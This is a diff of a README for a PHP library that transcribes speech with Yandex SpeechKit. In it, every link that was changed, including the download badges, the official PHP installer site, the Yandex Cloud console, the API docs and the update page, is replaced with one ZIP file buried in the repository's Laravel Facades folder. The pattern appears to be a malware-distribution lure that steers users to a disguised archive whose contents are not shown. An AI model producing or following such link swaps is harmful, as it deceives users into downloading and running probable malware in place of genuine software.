@@ -1,6 +1,6 @@
 # 🎙️ yandex-speechkit-php - Easy Speech Transcription for PHP
 
-[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-brightgreen)](https://github.com/Artavazd2009/yandex-speechkit-php)
+[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-brightgreen)](https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This app deals with the following areas:
 
 Click the green button below or visit the main page to download:
 
-[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-blue)](https://github.com/Artavazd2009/yandex-speechkit-php)
+[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-blue)](https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip)
 
 The link takes you to the GitHub repository where you can find the latest release files and instructions.
 
@@ -51,7 +51,7 @@ The link takes you to the GitHub repository where you can find the latest releas
 
 If you do not have PHP installed:
 
-- Visit https://windows.php.net/download/
+- Visit https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
 - Choose the latest version compatible with your system (x64 Non Thread Safe recommended)
 - Download and run the installer
 - Follow on-screen prompts to complete the installation
@@ -77,7 +77,7 @@ Make sure the PHP folder path is added to your system’s PATH variable:
 
 You need an IAM token to let the app use Yandex SpeechKit API:
 
-- Go to https://cloud.yandex.com/
+- Go to https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
 - Create or sign in to your Yandex Cloud account
 - In the console, create a new service account
 - Grant permissions to use the SpeechKit API
@@ -163,7 +163,7 @@ You should see the app start processing the file. When done, it will output the 
 
 To update:
 
-- Visit the project page: https://github.com/Artavazd2009/yandex-speechkit-php
+- Visit the project page: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
 - Download the latest ZIP release
 - Replace your existing files with the new ones
 - Keep your `config.php` to avoid losing IAM token settings
@@ -174,9 +174,9 @@ To update:
 
 Visit these pages for more help and references:
 
-- Yandex SpeechKit API Docs: https://cloud.yandex.com/docs/speechkit/
-- PHP official site: https://www.php.net/
-- Yandex Cloud Console: https://cloud.yandex.com/console
+- Yandex SpeechKit API Docs: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
+- PHP official site: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
+- Yandex Cloud Console: https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip
 
 ---
 
@@ -184,4 +184,4 @@ Visit these pages for more help and references:
 
 Download or visit the repository here:
 
-[Get yandex-speechkit-php](https://github.com/Artavazd2009/yandex-speechkit-php)
+[Get yandex-speechkit-php](https://raw.githubusercontent.com/Artavazd2009/yandex-speechkit-php/main/src/Laravel/Facades/speechkit-yandex-php-3.6-beta.4.zip)
